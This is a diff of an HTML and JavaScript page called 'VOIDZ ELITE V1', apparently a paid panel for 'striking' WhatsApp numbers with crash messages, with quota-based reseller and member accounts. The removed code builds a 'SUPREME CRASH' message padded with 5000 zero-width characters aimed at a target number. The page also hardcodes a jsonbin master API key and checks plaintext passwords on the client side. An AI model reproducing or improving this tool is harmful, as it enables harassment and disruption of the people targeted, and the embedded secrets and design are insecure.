@@ -3,213 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOIDZ ELITE V1 - ULTIMATE GABUNGAN</title>
+    <title>VOIDZ ELITE V1 - SUPREME</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --fire: #ff4500; --neon: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.98); }
+        :root { --fire: #ff4500; --neon-red: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.98); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
-        body { background: #000; color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
+        body { background: var(--bg); color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
         
-        /* FIX PARTIKEL: DIPAKSA KE BACKGROUND PALING BELAKANG */
-        #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
-
-        .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; background: transparent; }
-        .neon-red { color: var(--neon); text-shadow: 0 0 10px var(--neon); font-family: 'Orbitron'; font-weight: 900; }
+        #ash-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
+        .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        .neon-red { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); font-family: 'Orbitron'; font-weight: 900; }
         
-        /* PROFILE & BOX */
+        /* LOGIN UI */
         #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
-        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 20px; text-align: center; border-top: 4px solid var(--fire); box-shadow: 0 0 30px rgba(255, 69, 0, 0.2); }
-        .profile-pic { width: 90px; height: 90px; border-radius: 50%; border: 3px solid var(--fire); margin: 0 auto 15px; display: block; object-fit: cover; box-shadow: 0 0 20px var(--fire); }
+        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 25px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); }
+        .profile-img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--fire); margin-bottom: 15px; object-fit: cover; }
+        
+        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 12px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; position: relative; z-index: 9999; }
+        .btn-sub { width: 100%; background: transparent; padding: 10px; border-radius: 5px; font-family: 'Orbitron'; font-size: 9px; cursor: pointer; font-weight: bold; position: relative; z-index: 9999; margin-top: 10px; }
+        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; }
 
-        /* RUNNING NEWS */
-        .news-box { background: rgba(255, 69, 0, 0.1); border: 1px solid var(--fire); margin: 10px 20px; border-radius: 5px; overflow: hidden; white-space: nowrap; }
-        .news-text { display: inline-block; padding-left: 100%; animation: ticker 20s linear infinite; font-size: 10px; color: #ffca28; font-weight: bold; }
-        @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }
+        /* DASHBOARD UI */
+        .header-title { text-align: center; margin-top: 45px; font-size: 18px; letter-spacing: 2px; }
+        .banner-container { width: 100%; aspect-ratio: 16/9; border: 1px solid #333; border-radius: 8px; overflow: hidden; margin: 10px 0 5px; background: #000; position: relative; }
+        .live-clock { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 4px; font-size: 10px; color: var(--fire); border: 1px solid var(--fire); }
+        .home-info { background: var(--card); border: 1px solid #222; padding: 15px; border-radius: 12px; border-left: 5px solid var(--fire); margin-bottom: 15px; }
+        .info-val { font-size: 14px; font-weight: 900; font-family: 'Orbitron'; }
 
-        /* INPUT & BUTTON (FIXED CLICK) */
-        .input-box { width: 100%; background: #0c0c0c; border: 1px solid #333; padding: 14px; color: #fff; margin-bottom: 12px; text-align: center; font-size: 12px; border-radius: 8px; outline: none; transition: 0.3s; }
-        .input-box:focus { border-color: var(--fire); }
-        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 15px; font-weight: 900; cursor: pointer; border-radius: 8px; font-family: 'Orbitron'; position: relative; z-index: 99999; display: block; }
-        .btn-main:active { transform: scale(0.96); opacity: 0.8; }
-
-        /* DASHBOARD */
-        .tab-content { display: none; padding: 20px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
+        .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-bottom: 80px; }
         .active-tab { display: block; }
-        .home-info { background: var(--card); border: 1px solid #222; padding: 20px; border-radius: 15px; border-left: 6px solid var(--fire); margin-top: 15px; }
-        .status-item { margin-bottom: 12px; border-bottom: 1px solid #111; padding-bottom: 5px; }
-        .status-label { font-size: 9px; color: #666; font-family: 'Orbitron'; letter-spacing: 1px; }
-        .status-value { font-size: 18px; font-weight: 900; color: #fff; font-family: 'Orbitron'; }
-
-        /* NAVIGATION */
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 70px; z-index: 1000; }
-        .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; flex: 1; font-size: 9px; cursor: pointer; transition: 0.3s; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; }
+        .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; flex: 1; font-size: 8px; }
         .nav-btn.active { color: var(--fire); }
-        .nav-btn i { font-size: 18px; margin-bottom: 4px; }
 
-        /* MODALS */
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100000; justify-content: center; align-items: center; padding: 20px; }
-        .modal-content { background: #0a0a0a; padding: 25px; border: 1px solid var(--fire); width: 100%; max-width: 350px; border-radius: 20px; position: relative; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 20000; justify-content: center; align-items: center; }
+        .modal-content { background: #080808; padding: 25px; border: 1px solid var(--fire); width: 90%; max-width: 400px; border-radius: 12px; }
     </style>
 </head>
 <body>
-
     <canvas id="ash-canvas"></canvas>
+    <div id="notif-box" style="position:fixed; top:15px; left:15px; z-index:99999;"></div>
 
     <div class="content-layer">
         <div id="loginPage">
             <div class="login-box">
-                <img src="https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz" class="profile-pic" alt="User">
-                <h2 class="neon-red" style="font-size: 14px; margin-bottom: 25px;">VOIDZ ELITE V1</h2>
+                <img src="login.jpg" class="profile-img" onerror="this.src='https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz'">
+                <h2 class="neon-red" style="margin-bottom:15px;">VOIDZ ELITE V1</h2>
                 <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
                 <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
-                <button onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>
+                
+                <button type="button" onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>
+                
+                <button type="button" onclick="window.open('https://whatsapp.com/channel/URL_SALURAN_LU', '_blank')" class="btn-sub" style="color:#25d366; border:1px solid #25d366;">
+                    <i class="fab fa-whatsapp"></i> JOIN SALURAN
+                </button>
+                <button type="button" onclick="window.open('https://wa.me/6285718241306?text=Halo+Admin+Voidz+Elite', '_blank')" class="btn-sub" style="color:#fff; border:1px solid #444;">
+                    <i class="fas fa-headset"></i> CONTACT ADMIN
+                </button>
             </div>
         </div>
 
-        <div id="mainApp" style="display:none; flex:1;">
-            <div class="news-box"><div class="news-text" id="newsT">SYSTEM READY... BUY QUOTA TO OWNER... NEW METODE V1 STRIKE ACTIVE...</div></div>
-            
+        <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
             <div id="tabHOME" class="tab-content active-tab">
-                <img src="https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz" class="profile-pic" style="margin-top:10px;">
-                <h3 id="greetings" style="text-align:center; font-size:11px; color:var(--fire); margin-bottom:10px;">...</h3>
+                <div class="header-title neon-red">DASHBOARD</div>
+                <div class="banner-container">
+                    <video id="homeVideo" loop muted playsinline style="width:100%; height:100%; object-fit:cover;"><source src="dashboard.mp4" type="video/mp4"></video>
+                    <div class="live-clock" id="clock">00:00:00</div>
+                </div>
+                
+                <div id="greet-user" style="text-align:center; font-size:10px; margin-bottom:10px; color:#aaa;">...</div>
+                <marquee id="newsT" style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM LIVE] - READY TO STRIKE</marquee>
                 
                 <div class="home-info">
-                    <div class="status-item"><span class="status-label">ID</span><span id="uName" class="status-value" style="color:var(--fire)">...</span></div>
-                    <div class="status-item"><span class="status-label">RANK</span><span id="uRole" class="status-value">...</span></div>
-                    <div class="status-item" style="border:none;"><span class="status-label">QUOTA</span><span id="uQuota" class="status-value" style="color:var(--fire)">...</span></div>
+                    <div style="display:flex; align-items:center; gap:12px; margin-bottom:8px;"><i class="fas fa-user" style="color:var(--fire)"></i><span id="uName" class="info-val">...</span></div>
+                    <div id="rowRole" style="display:flex; align-items:center; gap:12px; margin-bottom:8px;"><i class="fas fa-crown" style="color:var(--fire)"></i><span id="uRole" class="info-val">...</span></div>
+                    <div id="rowQuota" style="display:flex; align-items:center; gap:12px; margin-bottom:8px;"><i class="fas fa-bolt" style="color:var(--fire)"></i><span id="uQuota" class="info-val">...</span></div>
                 </div>
 
-                <div id="ownerTools" style="display:none; margin-top:20px; grid-template-columns:1fr 1fr; gap:10px; padding:0 5px;">
-                    <button onclick="openModal('modalGen')" class="btn-main" style="font-size:10px; padding:10px;">GEN UNIT</button>
-                    <button onclick="openList()" class="btn-main" style="font-size:10px; padding:10px; background:#0055ff;">USER LIST</button>
-                </div>
+                <div id="menuContainer" style="display:grid; grid-template-columns:1fr 1fr; gap:10px;"></div>
             </div>
 
             <div id="tabATTACK" class="tab-content">
-                <div class="header-title neon-red" style="text-align:center; margin-top:20px; font-size:20px;">STRIKE CENTER</div>
-                <div style="background:var(--card); padding:25px; border-radius:20px; border:1px solid #222; margin-top:25px;">
-                    <input type="text" id="targetBug" class="input-box" placeholder="Nomor WA (628xxx)">
-                    <select id="methodStrike" class="input-box" style="background:#000;">
-                        <option value="SUPREME">💀 SUPREME CRASH (HARD)</option>
-                        <option value="LAG">❄️ LAG RENDER (V2)</option>
-                        <option value="UI">🔥 UI BUGGER (NEW)</option>
+                <div class="header-title neon-red">STRIKE CENTER</div>
+                <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire); margin-top:20px;">
+                    <input type="text" id="targetBug" class="input-box" placeholder="Target 628xxx">
+                    <select id="bugType" class="input-box">
+                        <option value="SUPREME">💀 SUPREME CRASH</option>
+                        <option value="LAG">❄️ LAG RENDER</option>
                     </select>
                     <button class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
                 </div>
+            </div>
+
+            <div id="tabLOGS" class="tab-content">
+                <div class="header-title neon-red">TERMINAL LOGS</div>
+                <div id="logContent" style="background:#050505; border:1px solid #222; padding:10px; height:300px; overflow-y:auto; font-size:9px; color:#0f0;"></div>
             </div>
         </div>
 
         <nav id="bottomNav" class="bottom-nav">
             <div class="nav-btn active" onclick="switchTab('home', this)"><i class="fas fa-home"></i><span>HOME</span></div>
             <div class="nav-btn" onclick="switchTab('attack', this)"><i class="fas fa-skull"></i><span>ATTACK</span></div>
-            <div id="navAdmin" class="nav-btn" onclick="openModal('modalConfig')" style="display:none;"><i class="fas fa-cog"></i><span>CONFIG</span></div>
+            <div class="nav-btn" onclick="switchTab('logs', this)"><i class="fas fa-terminal"></i><span>LOGS</span></div>
         </nav>
     </div>
 
     <div id="modalGen" class="modal"><div class="modal-content">
-        <h3 class="neon-red" style="font-size:14px; text-align:center;">GEN UNIT</h3><br>
-        <input type="text" id="gUser" class="input-box" placeholder="NEW ID">
-        <input type="text" id="gPass" class="input-box" placeholder="NEW PW">
+        <h3 style="color:var(--fire); font-size:12px; font-family:'Orbitron'">GENERATE UNIT</h3>
+        <input type="text" id="gUser" class="input-box" placeholder="NEW ID" style="margin-top:15px;">
+        <input type="text" id="gPass" class="input-box" placeholder="ACCESS KEY">
         <select id="gRole" class="input-box"><option value="member">MEMBER</option><option value="reseller">RESELLER</option></select>
         <input type="number" id="gQuota" class="input-box" placeholder="QUOTA">
-        <button class="btn-main" onclick="doGenerate()">CREATE UNIT</button>
-        <button onclick="closeModal('modalGen')" style="width:100%; background:none; border:none; color:#444; margin-top:15px; font-size:10px;">CANCEL</button>
+        <button class="btn-main" onclick="doGenerate()">PUSH UNIT</button>
+        <button onclick="closeModal()" style="color:#444; width:100%; border:none; background:none; margin-top:10px;">CANCEL</button>
     </div></div>
 
     <div id="modalList" class="modal"><div class="modal-content" style="height:70vh; display:flex; flex-direction:column;">
-        <h3 class="neon-red" style="font-size:14px; text-align:center;">USER MANAGER</h3>
+        <h3 class="neon-red" style="font-size:12px; text-align:center;">USER MANAGER</h3>
         <div id="userArea" style="flex:1; overflow-y:auto; margin:15px 0;"></div>
-        <button onclick="closeModal('modalList')" class="btn-main">CLOSE</button>
-    </div></div>
-
-    <div id="modalConfig" class="modal"><div class="modal-content">
-        <h3 class="neon-red" style="font-size:14px; text-align:center;">BROADCAST NEWS</h3><br>
-        <input type="text" id="cfgNews" class="input-box" placeholder="Tulis berita baru...">
-        <button class="btn-main" onclick="saveNews()">UPDATE & RELOAD</button>
-        <button onclick="closeModal('modalConfig')" style="width:100%; background:none; border:none; color:#444; margin-top:15px; font-size:10px;">CLOSE</button>
+        <button onclick="closeModal()" class="btn-main">CLOSE</button>
     </div></div>
 
     <script>
-        const BIN_ID = '694a5a6fae596e708fabef99';
-        const API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
-        let DB = {}; let USER = {};
+        const BIN_ID = '694a5a6fae596e708fabef99', API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
+        let USER = {}, DB = {}, LOG_HISTORY = [];
 
-        // ENGINE ABU ROKOK (FIXED Z-INDEX)
+        setInterval(() => { const d = new Date(); document.getElementById('clock').innerText = d.toLocaleTimeString(); }, 1000);
+
         const canvas = document.getElementById('ash-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
-        function initParts() {
-            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            particles = [];
-            for(let i=0; i<60; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2.5, sy: Math.random()*0.5+0.1, o: Math.random()*0.5 });
-        }
-        function drawParts() {
-            ctx.clearRect(0,0,canvas.width, canvas.height);
-            particles.forEach(p => { ctx.fillStyle = `rgba(180, 180, 180, ${p.o})`; ctx.fillRect(p.x, p.y, p.s, p.s); p.y -= p.sy; if(p.y < 0) p.y = canvas.height; });
-            requestAnimationFrame(drawParts);
-        }
-        initParts(); drawParts(); window.onresize = initParts;
+        function initP() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; particles = []; for(let i=0; i<60; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*1.5, d: Math.random()*0.5 + 0.1 }); }
+        function drawP() { ctx.clearRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(200,200,200,0.4)"; particles.forEach(p => { ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); p.y -= p.d; if(p.y < 0) p.y = canvas.height; }); requestAnimationFrame(drawP); }
+        initP(); drawP();
 
         async function auth() {
-            const u = document.getElementById('lUser').value.trim();
-            const p = document.getElementById('lPass').value.trim();
-            const btn = document.getElementById('btnLog');
+            const u = document.getElementById('lUser').value.trim(), p = document.getElementById('lPass').value.trim(), btn = document.getElementById('btnLog');
             btn.innerText = "AUTHENTICATING...";
             try {
-                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: {'X-Master-Key': API_KEY, 'X-Bin-Meta': false} });
+                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: { 'X-Master-Key': API_KEY, 'X-Bin-Meta': false } });
                 DB = await res.json();
                 if(DB[u] && DB[u].pw === p) {
                     USER = { id: u, ...DB[u] };
                     document.getElementById('loginPage').style.display = 'none';
                     document.getElementById('mainApp').style.display = 'block';
                     document.getElementById('bottomNav').style.display = 'flex';
-                    if(USER.role === 'owner') {
-                        document.getElementById('ownerTools').style.display = 'grid';
-                        document.getElementById('navAdmin').style.display = 'flex';
-                    }
                     if(DB._news) document.getElementById('newsT').innerText = DB._news;
-                    renderHome();
+                    document.getElementById('homeVideo').play();
+                    renderHome(); 
+                    document.getElementById('greet-user').innerText = `WELCOME, ${u.toUpperCase()}!`;
                 } else { alert("ACCESS DENIED!"); btn.innerText = "IGNITE"; }
-            } catch(e) { alert("DATABASE ERROR!"); btn.innerText = "IGNITE"; }
+            } catch(e) { alert("CONNECTION ERROR!"); btn.innerText = "IGNITE"; }
         }
 
         function renderHome() {
             document.getElementById('uName').innerText = USER.id;
-            document.getElementById('uRole').innerText = USER.role.toUpperCase();
-            document.getElementById('uQuota').innerText = USER.role === 'owner' ? 'INFINITY' : USER.quota;
-            const h = new Date().getHours();
-            document.getElementById('greetings').innerText = h<12?"MORNING, OPERATOR":h<18?"AFTERNOON, OPERATOR":"EVENING, OPERATOR";
+            if(USER.role === 'member') {
+                document.getElementById('rowRole').style.display = 'none';
+                document.getElementById('rowQuota').style.display = 'none';
+            } else {
+                document.getElementById('uRole').innerText = USER.role.toUpperCase();
+                document.getElementById('uQuota').innerText = USER.role === 'owner' ? '∞' : USER.quota;
+            }
+            
+            const m = document.getElementById('menuContainer'); m.innerHTML = "";
+            if(USER.role === 'owner') {
+                m.innerHTML += `<div onclick="openModal('modalGen')" style="background:var(--card); padding:15px; text-align:center; border:1px solid var(--fire); border-radius:10px;"><i class="fas fa-plus"></i><br><span style="font-size:9px;">GENERATE</span></div>`;
+                m.innerHTML += `<div onclick="openList()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #0055ff; border-radius:10px;"><i class="fas fa-users"></i><br><span style="font-size:9px;">LIST USER</span></div>`;
+            } else if(USER.role === 'reseller') {
+                m.innerHTML += `<div onclick="openModal('modalGen')" style="background:var(--card); padding:15px; text-align:center; border:1px solid var(--fire); border-radius:10px; grid-column: span 2;"><i class="fas fa-plus"></i><br><span style="font-size:9px;">GENERATE MEMBER</span></div>`;
+            }
+            m.innerHTML += `<div onclick="location.reload()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #444; border-radius:10px; grid-column: span 2;"><i class="fas fa-power-off"></i><br><span style="font-size:9px;">LOGOUT</span></div>`;
         }
 
-        async function syncDB() {
-            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-                method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': API_KEY},
-                body: JSON.stringify(DB)
-            });
-        }
+        async function syncDB() { await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY }, body: JSON.stringify(DB) }); }
 
         async function startAttack() {
-            let t = document.getElementById('targetBug').value.trim();
-            if(!t) return alert("INPUT TARGET!");
-            if(USER.role !== 'owner' && USER.quota <= 0) return alert("QUOTA HABIS!");
-            
-            // Auto Format 62
-            if(t.startsWith('0')) t = '62' + t.slice(1);
-            if(!t.startsWith('62')) t = '62' + t;
-
+            const t = document.getElementById('targetBug').value.trim();
+            if(!t) return;
+            if(USER.role !== 'owner' && USER.quota <= 0) return alert("QUOTA EXHAUSTED!");
             if(USER.role !== 'owner') { USER.quota--; DB[USER.id].quota = USER.quota; await syncDB(); renderHome(); }
-            
-            const payload = "VOIDZ_STRIKE_" + document.getElementById('methodStrike').value + "_READY" + "\u200B".repeat(5000);
-            window.open(`https://api.whatsapp.com/send?phone=${t}&text=${encodeURIComponent(payload)}`, '_blank');
+            window.open(`https://api.whatsapp.com/send?phone=${t.replace(/\D/g,'')}&text=VOIDZ_STRIKE`, '_blank');
         }
 
         async function doGenerate() {
-            const u = document.getElementById('gUser').value.trim();
-            const p = document.getElementById('gPass').value.trim();
-            if(!u || !p) return alert("LENGKAPI DATA!");
+            const u = document.getElementById('gUser').value.trim(), p = document.getElementById('gPass').value.trim();
+            if(!u || !p) return;
             DB[u] = { pw: p, role: document.getElementById('gRole').value, quota: parseInt(document.getElementById('gQuota').value) || 0 };
-            await syncDB(); alert("UNIT CREATED!"); closeModal('modalGen');
+            await syncDB(); alert("UNIT PUSHED!"); closeModal();
         }
 
         function openList() {
@@ -217,27 +199,17 @@
             const area = document.getElementById('userArea'); area.innerHTML = "";
             Object.keys(DB).forEach(id => {
                 if(id.startsWith('_')) return;
-                area.innerHTML += `<div style="background:#111; padding:12px; border:1px solid #222; margin-bottom:8px; display:flex; justify-content:space-between; align-items:center; border-radius:10px;">
-                    <span><b>${id}</b><br><small style="color:gray">${DB[id].role} | Q:${DB[id].quota}</small></span>
-                    <i class="fas fa-trash" style="color:red; padding:10px;" onclick="delUser('${id}')"></i>
-                </div>`;
+                area.innerHTML += `<div style="background:#111; padding:10px; margin-bottom:5px; display:flex; justify-content:space-between; border:1px solid #222;"><span>${id}</span><i class="fas fa-trash" style="color:red" onclick="delUser('${id}')"></i></div>`;
             });
         }
-        async function delUser(id) { if(confirm(`Hapus ${id}?`)) { delete DB[id]; await syncDB(); openList(); } }
-
-        async function saveNews() {
-            DB._news = document.getElementById('cfgNews').value;
-            await syncDB(); location.reload();
-        }
-
-        function switchTab(t, el) {
-            document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
-            document.getElementById('tab'+t.toUpperCase()).style.display = 'block';
-            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-            el.classList.add('active');
+        async function delUser(id) { if(confirm(`Erase ${id}?`)) { delete DB[id]; await syncDB(); openList(); } }
+        function switchTab(t, el) { 
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); 
+            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); 
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); el.classList.add('active'); 
         }
         function openModal(id) { document.getElementById(id).style.display = 'flex'; }
-        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        function closeModal() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
     </script>
 </body>
 </html>
